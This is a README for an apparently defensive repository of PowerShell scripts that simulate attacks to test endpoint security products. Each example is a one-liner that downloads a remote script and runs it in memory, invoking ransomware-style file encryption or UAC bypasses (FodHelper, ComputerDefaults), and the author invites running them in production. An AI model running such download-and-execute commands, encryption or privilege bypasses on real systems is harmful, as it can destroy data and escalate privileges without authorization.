# Vendor Simulator Test Scripts

I decided to create the following repository of scripts that can be executed on production environment.
Many customers are using different BAS products with the intention to validate existing EDR vendors.
BAS products can be expensive and hard to comprehend. They also operate within the concept of IOC in mind and mostly do not trigger attack events.

The scripts are created with a mission to validate the prevention capabilities of existing endpoint security solutions.
In most cases, i tried to focus on stealthy and advanced behaviour.

The scripts can be executed on production envirenmnet. 

**Example:**

## Ransomware techniques:

### Encryption - 
`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-RansomSIM.ps1"); Invoke-RansomSIM -Mode Encrypt -Path 'C:\Users\tester\Documents\Test';`

### Decryption - 
`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-RansomSIM.ps1"); Invoke-RansomSIM -Mode Decrypt -Path 'C:\Users\tester\Documents\Test';`

## User Account Control Bypass (UAC) 

### FodHelper
`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-UAC1.ps1"); Invoke-FodHelper;`

### ComputerDefaults
`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-UAC2.ps1"); Invoke-ComputerDefaults;`

## Antimalware Scan Interface (AMSI) 